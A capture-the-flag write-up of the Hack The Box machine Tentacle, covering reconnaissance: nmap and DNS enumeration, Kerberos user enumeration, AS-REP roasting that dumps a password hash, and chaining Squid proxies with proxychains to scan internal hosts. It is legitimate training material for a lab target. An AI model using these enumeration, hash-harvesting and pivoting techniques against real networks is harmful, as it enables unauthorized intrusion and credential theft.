---
title: HTB: Tentacle
url: https://0xdf.gitlab.io/2021/06/19/htb-tentacle.html
date: 2021-06-19T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, htb-tentacle, ctf, nmap, dig, dns, dnsenum, vhosts, kerbrute, kerberos, ntpdate, squid, as-rep-roast, john, proxychains, nmap-over-proxy, wpad, opensmtpd, exploitdb, cve-2020-7247, msmtprc, credentials, password-reuse, kinit, keytab, klist, htb-unbalanced, htb-joker, getfacl, facl
---

![Tentacle](https://0xdfimages.gitlab.io/img/tentacle-cover.png)

Tentacle was a box of two halves. The start is all about a squid proxy, and bouncing through two one them (one of them twice) to access an internal network, where I’ll find a wpad config file that alerts me to another internal network. In that second network, I’ll exploit an OpenSMTPd server and get a foothold. The second half was about abusing Kerberos in a Linux environment. I’ll use creds to get SSH authenticated by Kerberos, then abuse a backup script that give that principle access as another user. That user can access the KeyTab file, which allows them to administer the domain, and provides root access. In Beyond Root, a dive too deep into the rabbit hole of understanding the KeyTab file.

## Box Info

| Name | [Tentacle](https://hackthebox.com/machines/tentacle)  [Tentacle](https://hackthebox.com/machines/tentacle) [Play on HackTheBox](https://hackthebox.com/machines/tentacle) |
| --- | --- |
| Release Date | [23 Jan 2021](https://twitter.com/hackthebox_eu/status/1405178866822418432) |
| Retire Date | 19 Jun 2021 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Tentacle |
| Radar Graph | Radar chart for Tentacle |
| First Blood User | 14:51:41[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 16:35:51[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| Creator | [polarbearer polarbearer](https://app.hackthebox.com/users/159204) |

## Recon

### nmap

#### TCP

`nmap` found four open TCP ports, SSH (22), DNS (53), Kerberos (88), and Squid (3128):

```

oxdf@parrot$ sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.224
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-05 16:39 EDT
Nmap scan report for 10.10.10.224
Host is up (0.18s latency).
Not shown: 65530 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
53/tcp   open   domain
88/tcp   open   kerberos-sec
3128/tcp open   squid-http
9090/tcp closed zeus-admin

Nmap done: 1 IP address (1 host up) scanned in 96.18 seconds

oxdf@parrot$ sudo nmap -p 22,53,88,3128 -sCV -oA scans/nmap-tcpscans 10.10.10.224
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-05 16:57 EDT
Nmap scan report for 10.10.10.224
Host is up (0.025s latency).

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open  kerberos-sec MIT Kerberos (server time: 2021-06-05 21:00:55Z)
3128/tcp open  http-proxy   Squid http proxy 4.11
|_http-server-header: squid/4.11
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.86 seconds

```

The Bind DNS version is suggesting this is RedHat Linux 8. There’s also a hostname, realcorp.htb.

#### Closed vs Filtered

`nmap` also noted that 9090 was closed, which `nmap` is smart enough to identify is different from the rest of the ports which return `filtered`. For example:

```

oxdf@parrot$ sudo nmap -p 9088-9092 10.10.10.224
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 06:46 EDT
Nmap scan report for 10.10.10.224
Host is up (0.022s latency).

PORT     STATE    SERVICE
9088/tcp filtered sqlexec
9089/tcp filtered sqlexec-ssl
9090/tcp closed   zeus-admin
9091/tcp filtered xmltec-xmlmail
9092/tcp filtered XmlIpcRegSvc

Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds

```

In Wireshark, that looks like:

![image-20210606064725593](https://0xdfimages.gitlab.io/img/image-20210606064725593.png)

The packets up through 0.252 seconds are `nmap` trying to see if the host is up with a ping and requests to 80 and 443. Then at 0.93, it sends SYN packets to the five ports I requested. 9090 sends back a RST (reset) / ACK (acknowledge) packet, which indicates the port is closed. For the other four hosts, Tentacle sends back an ICMP Destination Unreachable message, which `nmap` reports as filtered.

I’ll keep an eye out for ways that I might interact with 9090 in a different way, as it is behaving differently from the rest of the ports I can’t interact with (though it turns out to be nothing).

#### UDP

I generally start a UDP scan in the background, but I’m especially keen to given the presence of DNS on TCP, which suggests it’s likely listening on UDP as well. This scan took forever, but did return three open ports, DNS (53), Kerberos (88), and NTP (123):

```

oxdf@parrot$ sudo nmap -sU -sV 10.10.10.224
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-05 16:59 EDT                                                                                     
Nmap scan report for 10.10.10.224                                         
Host is up (0.020s latency).     
Not shown: 997 filtered ports
PORT    STATE SERVICE       VERSION  
53/udp  open  domain        ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
88/udp  open  kerberos-sec?   
123/udp open  ntp           NTP v4 (secondary server)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/
submit.cgi?new-service :
SF-Port88-UDP:V=7.91%I=7%D=6/5%Time=60BBEA0C%P=x86_64-pc-linux-gnu%r(Kerbe
SF:ros,5B,"~Y0W\xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e\xa4\x11\x18\x0f202
SF:10605212059Z\xa5\x05\x02\x03\x06i2\xa6\x03\x02\x01\x06\xa9\x04\x1b\x02N 
SF:M\xaa\x170\x15\xa0\x03\x02\x01\0\xa1\x0e0\x0c\x1b\x06krbtgt\x1b\x02NM\x 
SF:ab\r\x1b\x0bNULL_CLIENT");                                             
Service Info: OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                      
Nmap done: 1 IP address (1 host up) scanned in 1186.22 seconds

```

### DNS - TCP/UDP 53

Any time there’s TCP DNS, it’s worth trying to do a zone transfer, which is a query that, if enabled, would return all the domains the DNS server knows about associated with a given domain. I can try with and without the domain I found above, realcorp.htb, but neither return anything:

```

oxdf@parrot$ dig axfr @10.10.10.224

; <<>> DiG 9.16.15-Debian <<>> axfr @10.10.10.224
; (1 server found)
;; global options: +cmd
;; Query time: 15 msec
;; SERVER: 10.10.10.224#53(10.10.10.224)
;; WHEN: Sun Jun 06 10:28:08 EDT 2021
;; MSG SIZE  rcvd: 56

oxdf@parrot$ dig axfr @10.10.10.224 realcorp.htb

; <<>> DiG 9.16.15-Debian <<>> axfr @10.10.10.224 realcorp.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.

```

I checked tentacle.htb on a bit of a whim, but no info there either.

Just asking the server what for records associated with realcorp.htb, it returns a SOA record that includes root.realcorp.htb:

```

oxdf@parrot$ dig realcorp.htb @10.10.10.224

; <<>> DiG 9.16.15-Debian <<>> realcorp.htb @10.10.10.224
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 53538
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 12c7daf51bfe2eb9cd9d6ebc60bcdd1f70a8e73f68c042d6 (good)
;; QUESTION SECTION:
;realcorp.htb.                  IN      A

;; AUTHORITY SECTION:
realcorp.htb.           86400   IN      SOA     realcorp.htb. root.realcorp.htb. 199609206 28800 7200 2419200 86400

;; Query time: 39 msec
;; SERVER: 10.10.10.224#53(10.10.10.224)
;; WHEN: Sun Jun 06 10:32:11 EDT 2021
;; MSG SIZE  rcvd: 110

```

Even though the DNS server doesn’t return IPs for either domain, in the HTB world, those probably both associate with the host IP, so I’ll add them to my `/etc/hosts` file for now.

`dnsenum` will brute force subdomains over DNS. This is similar to how I might brute force subdomains using `wfuzz` or `fuff` looking for virtual hosts in a webserver, but this time it’s trying to resolve DNS subdomains and seeing if any come back with records. This takes a while, so I’ll run it in the background while looking at other things:

```

oxdf@parrot$ dnsenum --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o scans/dnsenum-bitquark-realcorp.htb realcorp.htb
dnsenum VERSION:1.2.6
-----   realcorp.htb   -----
...[snip]...
Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:
________________________________________________________________________________________

ns.realcorp.htb.                         259200   IN    A        10.197.243.77
proxy.realcorp.htb.                      259200   IN    CNAME    ns.realcorp.htb.
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
wpad.realcorp.htb.                       259200   IN    A        10.197.243.31
...[snip]...

```

It finds three more subdomains. These each have their own IP addresses. It’s not clear exactly what they mean, and if they are legit IPs in use or if they are relics of the environment that the box author created the box in. It is definitely true that `wpad` has a different IP from `ns`/`proxy`.

Alternatively, `nmap` has a `-sL` option, which will do host identification over DNS (it will print a line for each host, so I’ll grep on `(` which is where a reverse resolution came back). It finds the same hosts:

```

oxdf@parrot$ nmap -sL --dns-servers 10.10.10.224 10.197.243.0/24 | grep -F '('
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 17:06 EDT
Nmap scan report for wpad.realcorp.htb (10.197.243.31)
Nmap scan report for ns.realcorp.htb (10.197.243.77)
Nmap done: 256 IP addresses (0 hosts up) scanned in 0.13 seconds

```

I need to give it the DNS server to look at (Tentacle), or else it will use the system resolver and find nothing.

I could also manually do the same thing with `dig` and the `-x` flag to do a reverse lookup by IP. The second answer in this [post](https://serverfault.com/questions/357058/combining-dig-short-command) gives nice syntax for getting a one line answer:

```

oxdf@parrot$ dig +noall +answer @10.10.10.224 -x 10.197.243.31
31.243.197.10.in-addr.arpa. 259200 IN   PTR     wpad.realcorp.htb.

```

I’ll loop over the rest of the class C, but there are no additional hosts:

```

oxdf@parrot$ for i in {1..254}; do dig +noall +answer @10.10.10.224 -x 10.197.243.$i; done
31.243.197.10.in-addr.arpa. 259200 IN   PTR     wpad.realcorp.htb.
77.243.197.10.in-addr.arpa. 259200 IN   PTR     ns.realcorp.htb.

```

### Kerberos - TCP/UDP 88

Without a user or creds, all I can really get from Kerberos is a test of if a user exists in the domain. I’ll use [kerbrute](https://github.com/ropnop/kerbrute) in userenum mode. I tried a couple different wordlists, but didn’t find anything:

```

oxdf@parrot$ kerbrute userenum -d realcorp.htb --dc realcorp.htb /usr/share/seclists/Usernames/cirt-default-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/06/21 - Ronnie Flathers @ropnop

2021/06/06 10:35:22 >  Using KDC(s):
2021/06/06 10:35:22 >   realcorp.htb:88

2021/06/06 10:35:24 >  Done! Tested 827 usernames (0 valid) in 1.928 seconds

```

### NTP - UDP 123

HackTricks has a page on [Pentesting NTP](https://book.hacktricks.xyz/pentesting/pentesting-ntp). I couldn’t get any of the `ntpq` commands to respond, but the `nmap` script did give the current time on the box:

```

oxdf@parrot$ sudo nmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 10.10.10.224
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 10:26 EDT
Nmap scan report for 10.10.10.224
Host is up (0.019s latency).

PORT    STATE SERVICE VERSION
123/udp open  ntp     NTP v4 (secondary server)
| ntp-info: 
|_  receive time stamp: 2021-06-06T14:29:14

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.81 seconds

```

I could also get that offset from `ntpdate`:

```

oxdf@parrot$ date; ntpdate -q 10.10.10.224
Thu 17 Jun 2021 08:53:17 AM EDT
server 10.10.10.224, stratum 10, offset +182.852870, delay 0.04570
17 Jun 08:53:17 ntpdate[6637]: step time server 10.10.10.224 offset +182.852870 sec

```

The first line is the output of `date`, the time on my local host. The next two come from `ntpdate`. On the last line, it prints my host’s time, as well as the offset to the time on Tentacle, which is about three minutes (183 seconds) ahead of my host.

Not much else I can expect from NTP.

### Squid - TCP 3128

I attempted to set up the Squid in FoxyProxy the way I did in [Unbalanced](/2020/12/05/htb-unbalanced.html#squid---tcp-3128) and [Joker](/2020/08/13/htb-joker.html#enumeration-through-proxy). For some reason, on trying to request `http://10.10.10.224`, Firefox would just hang. Looking at the stream in Wireshark, first Firefox issues a `CONNECT` request:

```

CONNECT 10.10.10.224:443 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Proxy-Connection: keep-alive
Connection: keep-alive
Host: 10.10.10.224:443

```

The response is a 407 `Proxy Authentication Required`:

```

HTTP/1.1 407 Proxy Authentication Required
Server: squid/4.11
Mime-Version: 1.0
Date: Sun, 06 Jun 2021 14:58:14 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 3759
X-Squid-Error: ERR_CACHE_ACCESS_DENIED 0
Vary: Accept-Language
Content-Language: en-us
Proxy-Authenticate: Basic realm="Web-Proxy"
X-Cache: MISS from .realcorp.htb
X-Cache-Lookup: NONE from srv01.realcorp.htb:3128
Via: 1.1 srv01.realcorp.htb (squid/4.11)
Connection: keep-alive

<html><head>
<meta type="copyright" content="Copyright (C) 1996-2020 The Squid Software Foundation and contributors">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>ERROR: Cache Access Denied</title>
...[snip]...

```

I’ll save the HTML that comes back as a file and open it in Firefox:

```

oxdf@parrot$ curl -s --proxy 10.10.10.224:3128 http://10.10.10.224 > 10.10.10.224.html
oxdf@parrot$ firefox 10.10.10.224.html

```

The resulting page has some useful info:

![image-20210606110713223](https://0xdfimages.gitlab.io/img/image-20210606110713223.png)

The cache administrator’s email is `j.nakazawa@realcorp.htb`. The hostname at the bottom is `srv01.realcorp.htb`.

If I do the exact same thing, but request `http://127.0.0.1` instead of `http://10.10.10.224`, there’s actually a different error:

```

oxdf@parrot$ curl -s --proxy 10.10.10.224:3128 http://127.0.0.1 > 127.0.0.1.html
oxdf@parrot$ firefox 127.0.0.1.html

```

![image-20210606110849958](https://0xdfimages.gitlab.io/img/image-20210606110849958.png)

The first time it said the request was unauthorized, but this time it says the connection failed. This implies that the requirement for authentication may not apply to localhost.

### AS-REP-ROAST

With the username, I can try to get a hash off of Kerberos using `GetNPUsers.py`. This will return a hash if the `UF_DONT_REQUIRE_PREAUTH` flag is set for the user. It works:

```

oxdf@parrot$ GetNPUsers.py -no-pass -dc-ip 10.10.10.224 realcorp.htb/j.nakazawa | tee j.nakazawa.hash
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for j.nakazawa
$krb5asrep$18$j.nakazawa@REALCORP.HTB:7587a44ff02ac18b6d395220a463a359$108aeca04223f28b985c5e9e48314e4de555620574e3af19f201cb17968e973a8fb4e69a38681159d2b032f4807680f8d68547eb2407a56c5a5293fe633769e80d20ec7c88e1b5958676645adbf2f08c15e472053db9e65785815084bce1ddc76ef43bbda02cc685411378d82f72fda5abc6c51ca33019da4cbf27b62713f85d67429743f3abb622264766c4772fe1f9ed38433f4e1eef729905dde9419d4bbe2291c5a79765c7198564bae8745e26dcd99fae17539669b87722b7cd8b06d067589ecd5d364a0af81d7f97d7ef22bdf73e2a66e71c03559ebdb9

```

This type of hash [isn’t implemented in hashcat yet](https://github.com/hashcat/hashcat/issues/2603), but `john` will give it a run:

```

oxdf@parrot$ john j.nakazawa.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:40 DONE (2021-06-06 15:19) 0g/s 352773p/s 352773c/s 352773C/s        1..*7¡Vamos!
Session completed

```

It doesn’t crack with anything in `rockyou.txt`, so it’s likely not the way.

### nmap via Squid

#### localhost

I wanted to try scanning through the proxy. I create a `proxychains` config that would route through the Squid:

```

strict_chain
proxy_dns
[ProxyList]
http 10.10.10.224 3128

```

It took a bit of playing with `nmap` to get it to work. I worked without disabling the `proxychains` messages so I could troubleshoot, and just with the top ten ports until I got something working like this:

```

oxdf@parrot$ sudo proxychains -f proxy-squid.conf nmap --top-ports 10 -sT -Pn 127.0.0.1
[proxychains] config file found: proxy-squid.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 07:32 EDT
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:139 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:21 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:445 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:23 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:25 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:22  ...  OK
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:80 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3389 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:110 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:443 <--denied
Nmap scan report for localhost (127.0.0.1)
Host is up (0.046s latency).

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   open   ssh
23/tcp   closed telnet
25/tcp   closed smtp
80/tcp   closed http
110/tcp  closed pop3
139/tcp  closed netbios-ssn
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds

```

`-sT` will do a full TCP connect scan, rather than the default `-sS` SYN scan. A SYN scan won’t work here because the proxy isn’t passing the TCP handshake packets back to my VM, so a SYN scan, which sends the SYN packet, sees the ACK, and then ends the connection, won’t be passed back over the proxy. `-Pn` also necessary because the typical host detection `nmap` does involves sending ICMP and TCP on 80 and 443. ICMP won’t go over the proxy, and 80 and 443 are likely not open, so it just returns that the host is down. `-Pn` tells `nmap` to continue scanning without that check.

Typically a Squid proxy limits what it will forward through, but that fact that I was able to scan SSH suggests this is a non-default config. I’ll scan the top 1000 ports (and add `-q` to `proxychains` so I don’t see every failed connection):

```

oxdf@parrot$ sudo proxychains -q -f proxy-squid.conf nmap --top-ports 1000 -sT -Pn 127.0.0.1
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 10:25 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.046s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http

Nmap done: 1 IP address (1 host up) scanned in 46.98 seconds

```

It looks very similar to what I could see from the outside. Two new ports, 464 and 749, but not much I can do with those. It is interesting to note that I can connect to 3128.

I did try explicitly scanning port 9090, but it’s still closed:

```

oxdf@parrot$ sudo proxychains -q -f proxy-squid.conf nmap -p 9090 -sT -Pn 127.0.0.1
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 10:28 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.038s latency).

PORT     STATE  SERVICE
9090/tcp closed zeus-admin

Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds

```

#### Other IPs

I tried scanning the other two IPs from the DNS results, but both failed:

```

oxdf@parrot$ sudo proxychains -q -f proxy-squid.conf nmap --top-ports 100 -sT -Pn 10.197.243.77
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 10:27 EDT
Nmap scan report for ns.realcorp.htb (10.197.243.77)
Host is up (0.049s latency).
All 100 scanned ports on ns.realcorp.htb (10.197.243.77) are closed

Nmap done: 1 IP address (1 host up) scanned in 4.95 seconds
oxdf@parrot$ sudo proxychains -q -f proxy-squid.conf nmap --top-ports 100 -sT -Pn 10.197.243.31
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 10:27 EDT
Nmap scan report for wpad.realcorp.htb (10.197.243.31)
Host is up (0.047s latency).
All 100 scanned ports on wpad.realcorp.htb (10.197.243.31) are closed

Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds

```

### nmap via Squid x2

I already noticed above that there was a different going to 10.10.10.224 vs localhost. What if I can nest proxies, first going through 10.10.10.224:3128 and then through 127.0.0.1:3128. That would leave the traffic as if it’s coming from Tentacle, and as I noted above, I’m able to connect to 3128. I’ll create another `proxychains` config, `proxy-squid-x2.conf`:

```

strict_chain
proxy_dns
[ProxyList]
http 10.10.10.224 3128
http 127.0.0.1 3128

```

`strict_chain` means that it will only work if it goes through each of the proxies in the list. I’ll scan again with ten ports to check:

```

oxdf@parrot$ sudo proxychains -f proxy-squid-x2.conf nmap --top-ports 10 -sT -Pn 127.0.0.1
[proxychains] config file found: proxy-squid-x2.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 10:31 EDT
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:443 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:22  ...  OK
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:25 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:23 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:445 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:139 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:110 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:21 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:80 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:3389 <--denied
Nmap scan report for localhost (127.0.0.1)
Host is up (0.068s latency).

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   open   ssh
23/tcp   closed telnet
25/tcp   closed smtp
80/tcp   closed http
110/tcp  closed pop3
139/tcp  closed netbios-ssn
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds

```

The `proxychains` output for the one port open, 22, shows it’s going through the Squid twice:

```

[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  127.0.0.1:22  ...  OK

```

The 1000 port scan of 127.0.0.1 looked the same.

But, when I scanned the other two IPs, it was able to connect to 10.197.243.77 (where it didn’t through just one layer of proxy). 10.197.243.77 has the same ports as 10.10.10.224:

```

oxdf@parrot$ sudo proxychains -q -f proxy-squid-x2.conf nmap --top-ports 1000 -sT -Pn 10.197.243.77
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 16:07 EDT
Nmap scan report for ns.realcorp.htb (10.197.243.77)
Host is up (0.072s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http

Nmap done: 1 IP address (1 host up) scanned in 69.90 seconds

```

### nmap via Squid x3
10.197.243.77 was named `proxy.realcorp.htb` and `ns.realcorp.htb`. If it’s a proxy, maybe it’s some kind of gateway into the internal network. `proxy-squid-x3.conf`:

```

strict_chain
proxy_dns
[ProxyList]
http 10.10.10.224 3128
http 127.0.0.1 3128
http 10.197.243.77 3128

```

This will bounce through three proxies on the way to the target. I’ll try scanning 10.197.243.31 again. First with loud `proxychains` and just ten ports to make sure it’s working like I would expect:

```

oxdf@parrot$ sudo proxychains -f proxy-squid-x3.conf nmap --top-ports 10 -sT -Pn 10.197.243.31
[proxychains] config file found: proxy-squid-x3.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 16:17 EDT
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:21 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:443 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:3389 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:23 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:80  ...  OK
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:445 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:22  ...  OK
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:139 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:110 <--denied
[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:25 <--denied
Nmap scan report for wpad.realcorp.htb (10.197.243.31)
Host is up (0.094s latency).

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   open   ssh
23/tcp   closed telnet
25/tcp   closed smtp
80/tcp   open   http
110/tcp  closed pop3
139/tcp  closed netbios-ssn
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds

```

Looking at the `proxychains` output, it’s clearly routing through 10.10.10.224 –> 127.0.0.1 (10.10.10.224 again) –> 10.197.243.77 –> 10.197.243.31. That’s neat. And now there are different ports open on 10.197.243.31:

```

oxdf@parrot$ sudo proxychains -q -f proxy-squid-x3.conf nmap --top-ports 1000 -sT -Pn 10.197.243.31
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 16:19 EDT
Nmap scan report for wpad.realcorp.htb (10.197.243.31)
Host is up (0.092s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http

Nmap done: 1 IP address (1 host up) scanned in 93.82 seconds

```

### wpad

Squid seems to be running on 10.197.243.31 as well, but I’m out of targets to proxy to. But, 80 is open on this host, and it is named `wpad.realcorp.htb`. WPAD, or [Web Proxy Auto-Discovery Protocol](https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol) is a way for clients to automatically find and use a proxy configuration file. The client gets the WPAD URL either using DHCP or DNS.

> For DNS lookups, the path of the configuration file is always *wpad.dat*. For the DHCP protocol, any URL is usable. For traditional reasons, PAC files are often called *proxy.pac* (of course, files with this name will be ignored by the WPAD DNS search).

Given that there’s a `wpad.realcorp.htb` domain, it seems like DNS maybe being used, and TCP 80 is open on that host. Getting the root by IP returns a default test page:

```

oxdf@parrot$ proxychains -q -f proxy-squid-x3.conf curl http://10.197.243.31
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
                                      
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
    <head>                       
        <title>Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
...[snip]...

